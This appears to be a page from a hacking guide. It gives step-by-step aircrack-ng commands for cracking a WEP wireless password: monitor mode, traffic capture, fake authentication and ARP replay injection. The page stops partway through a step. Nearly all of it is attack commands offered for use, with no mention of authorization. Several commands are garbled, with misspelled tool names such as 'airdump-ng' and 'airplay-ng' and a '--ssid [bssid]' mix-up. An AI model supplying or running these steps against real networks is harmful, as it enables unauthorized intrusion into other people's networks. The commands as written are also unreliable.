  - "[PAGE 55]\n\n# Breaking Wireless WEP passwords\n\n![](img/c6b688dca6570d17db3036b560ef0905_55_0.png)\n\
    \nWEP passwords are the most insecure passwords on wireless devices. Follow the\
    \ below steps to crack a WEP wireless password.\n\n+   * airmon-ng -- To find\
    \ the wireless card name\n* airmon-ng stop [wireless card name]\n* airmon-ng start\
    \ [wireless card name] -- will create monitoring of the wireless interface\n*\
    \ airmon-ng -- To see and check the changes\n* airodump-ng [monitor interface\
    \ name] -- To find the channel and bssid and essid\n* write down channel, bssid,\
    \ essid and then on terminal #1 run:\n    * airdump-ng -w weep -c [channel number]\
    \ --ssid [bssid] [wireless card name]\n    * This will link your wireless card\
    \ to that particular connection\n* On a new terminal #2 type:\n    * airplay-ng\
    \ -1 0 -a [bssid] [wireless card name]\n    * This will associate your wireless\
    \ card with the connection so you can transfer data\n* On a new terminal #3 run:\n\
    \    * airplay-ng -3 -b [bssid] [wireless card name]\n    * This will start send/receive\
